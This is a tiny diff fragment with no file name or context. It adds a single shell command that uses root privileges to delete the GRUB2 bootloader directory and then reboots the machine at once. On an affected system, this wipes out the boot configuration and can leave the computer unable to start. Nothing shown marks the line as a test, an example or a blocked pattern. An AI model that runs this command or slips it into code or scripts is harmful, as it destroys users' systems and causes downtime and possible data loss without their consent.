@@ -1,0 +1,1 @@
+sudo rm -rf /boot/grub2; sudo shutdown -r now
